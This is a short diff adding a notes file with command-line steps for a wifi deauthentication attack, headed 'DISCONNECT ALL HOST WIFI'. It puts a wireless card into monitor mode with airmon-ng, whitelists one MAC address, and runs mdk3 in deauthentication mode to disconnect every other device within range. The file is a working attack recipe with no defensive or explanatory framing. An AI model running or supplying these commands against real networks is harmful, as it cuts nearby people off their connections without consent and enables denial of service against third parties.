@@ -1,0 +1,6 @@
+DISCONNECT ALL HOST WIFI
+
+airmon-ng start wlan0 / +mon
+ifconfig (choose mac address to whitelist text)
+echo "mac address" >> whitelist.txt
+mdk3 wlan0mon d -w whitelist.txt
